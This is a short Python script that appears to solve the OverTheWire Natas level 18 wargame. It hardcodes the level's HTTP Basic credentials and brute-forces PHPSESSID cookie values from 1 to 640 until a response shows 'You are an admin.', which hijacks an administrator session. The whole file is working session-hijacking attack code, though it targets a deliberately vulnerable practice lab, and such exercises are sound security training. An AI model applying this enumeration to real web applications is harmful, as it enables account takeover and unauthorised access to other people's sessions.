import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

url = "http://natas18.natas.labs.overthewire.org"
string = 'You are an admin.'

for i in range(1,641):
	print('id ',i)
	cookies = dict(PHPSESSID=str(i))
	r = requests.get(url,auth=auth,cookies=cookies)
	if r.content.find(string) != -1:
		print(r.content)
		break

